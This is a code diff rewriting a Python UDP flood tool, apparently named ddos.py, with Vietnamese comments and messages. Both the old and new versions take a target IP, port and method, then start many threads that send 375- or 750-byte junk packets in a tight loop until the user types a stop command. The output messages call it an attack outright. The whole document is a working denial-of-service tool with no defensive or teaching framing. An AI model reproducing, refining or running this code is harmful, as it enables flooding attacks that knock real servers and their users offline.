@@ -1,82 +1,66 @@
-
 import sys
 import socket
 import threading
-import time
 
-running = True
+host = str(sys.argv[1])
+port = int(sys.argv[2])
+method = str(sys.argv[3])
 
-def send_packet(host, port, amplifier):
+running = True  # Biến cờ để dừng các luồng khi cần
+
+packet_data_1 = b"\x99" * 375
+packet_data_2 = b"\x99" * 750
+
+def send_packet(data):
+    global running
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.connect((host, port))
         while running:
-            try:
-                s.sendto(b"\x99" * amplifier, (host, port))
-                time.sleep(0.01)
-            except Exception as e:
-                print(f"Send error: {str(e)}")
-                break
+            s.send(data)
+    except:
+        pass
     finally:
         s.close()
 
-def attack():
+def user_input_monitor():
     global running
-    
-    if len(sys.argv) < 4:
-        print("Cách dùng: python ddos.py <ip> <port> <method>")
-        print("Các phương thức: UDP-Flood, UDP-Power, UDP-Mix")
-        return
+    while True:
+        cmd = input()
+        if cmd.strip().lower() == "/thoat":
+            print("Đã nhận lệnh /thoat. Dừng tấn công...")
+            running = False
+            break
 
-    host = sys.argv[1]
-    port = int(sys.argv[2])
-    method = sys.argv[3].upper()
-    loops = 10000
-
-    methods = {
-        "UDP-FLOOD": [375],
-        "UDP-POWER": [750],
-        "UDP-MIX": [375, 750]
-    }
-
-    if method not in methods:
-        print("Phương thức không hợp lệ!")
-        return
-
-    print(f"Bắt đầu tấn công {host}:{port} ({method})")
-    print("Nhập '/stop' để dừng")
-
+def attack_HQ():
     threads = []
-    for _ in range(loops):
-        for amp in methods[method]:
-            t = threading.Thread(
-                target=send_packet,
-                args=(host, port, amp),
-                daemon=True
-            )
+
+    if method == "UDP-Flood":
+        for _ in range(30):
+            t = threading.Thread(target=send_packet, args=(packet_data_1,))
             t.start()
             threads.append(t)
-        time.sleep(0.1)
 
-    def check_stop():
-        global running
-        while running:
-            cmd = input().strip().lower()
-            if cmd == '/stop':
-                running = False
-                break
-    
-    threading.Thread(target=check_stop, daemon=True).start()
+    elif method == "UDP-Power":
+        for _ in range(30):
+            t = threading.Thread(target=send_packet, args=(packet_data_2,))
+            t.start()
+            threads.append(t)
 
-    try:
-        while running:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        running = False
-    
-    print("Đang dừng tất cả kết nối...")
-    time.sleep(2)
-    print("Tấn công đã dừng")
+    elif method == "UDP-Mix":
+        for _ in range(15):
+            t1 = threading.Thread(target=send_packet, args=(packet_data_1,))
+            t2 = threading.Thread(target=send_packet, args=(packet_data_2,))
+            t1.start()
+            t2.start()
+            threads.extend([t1, t2])
 
-if _name_ == "_main_":
-    attack()
+    # Bắt đầu luồng chờ lệnh "/thoat"
+    threading.Thread(target=user_input_monitor, daemon=True).start()
+
+    # Chờ các luồng chính kết thúc
+    for t in threads:
+        t.join()
+
+attack_HQ()
